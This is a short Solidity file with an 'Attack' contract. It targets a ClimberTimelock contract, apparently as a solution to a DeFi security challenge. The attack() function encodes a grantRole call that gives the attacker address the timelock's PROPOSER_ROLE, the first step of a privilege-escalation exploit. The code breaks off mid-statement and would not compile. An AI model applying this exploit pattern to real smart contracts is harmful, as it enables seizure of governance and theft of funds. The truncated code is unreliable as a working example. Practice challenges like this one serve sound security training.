// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

import {ClimberTimelock} from "./ClimberTimelock.sol";

contract Attack {
    address private _attacker;
    ClimberTimelock internal climberTimelock;

    constructor(address attacker_, address payable climberTimelock_) {
        _attacker = attacker_;
        climberTimelock = ClimberTimelock(climberTimelock_);
    }

    function attack() external {
        address[] memory targets = new address[](1);
        targets[0] = address(climberTimelock);
        uint256[] memory values = new uint256[](1);
        bytes[] memory datas = new bytes[](1);

        values[0] = uint256(0);
        datas[0] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            climberTimelock.PROPOSER_ROLE(),
            _attacker
        );
        bytes32 salt = keccak256(abi.encodePacked(block.timestamp, _attacker));
        climberTimelock
    }
}
